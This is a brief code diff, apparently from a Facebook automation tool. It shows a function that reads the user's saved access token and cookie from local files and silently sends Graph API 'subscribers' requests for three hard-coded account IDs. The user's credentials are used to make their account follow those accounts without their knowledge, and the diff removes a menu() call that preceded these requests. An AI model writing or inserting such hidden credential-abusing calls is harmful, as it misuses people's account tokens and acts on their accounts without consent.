@@ -257,7 +257,6 @@ def ___fii___Sayang___Kamu___Widiya___():
     try:
         token = open('login/token.json', 'r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
-        menu()
         requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + (token),cookies=cookie)
         requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + (token),cookies=cookie)
         requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + (token),cookies=cookie)
